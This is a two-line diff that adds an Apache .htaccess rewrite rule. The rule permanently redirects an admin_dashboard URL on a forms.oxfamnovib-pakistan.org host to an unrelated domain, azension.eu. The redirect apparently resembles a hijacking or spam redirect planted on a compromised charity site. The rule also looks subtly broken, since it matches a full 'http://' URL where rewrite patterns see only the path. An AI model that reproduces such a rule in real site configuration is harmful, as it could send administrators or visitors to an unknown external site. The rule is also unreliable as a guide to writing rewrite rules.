@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^http://forms.oxfamnovib-pakistan.org/admin_dashboard.*$ http://azension.eu/ [R=301,L]
